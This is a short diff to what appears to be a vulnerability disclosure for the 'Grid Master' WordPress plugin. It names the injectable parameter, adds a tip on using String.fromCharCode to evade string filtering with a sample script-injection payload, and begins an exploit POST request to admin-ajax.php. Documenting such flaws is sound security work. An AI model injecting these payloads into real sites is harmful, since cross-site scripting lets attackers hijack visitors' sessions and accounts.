@@ -1,6 +1,8 @@
 VULNERABLE PLUGIN: Grid Master 
 VULNERABLE PARAMETER: argsArray[read_more_text]
 
+Use the "String.FromCharCode" function to execute payloads with strings.  
+Example: `<script>alert(String.fromCharCode(70, 114, 49, 116, 48))</script>`
 
 POST /wp-admin/admin-ajax.php HTTP/2
 Host: host.com
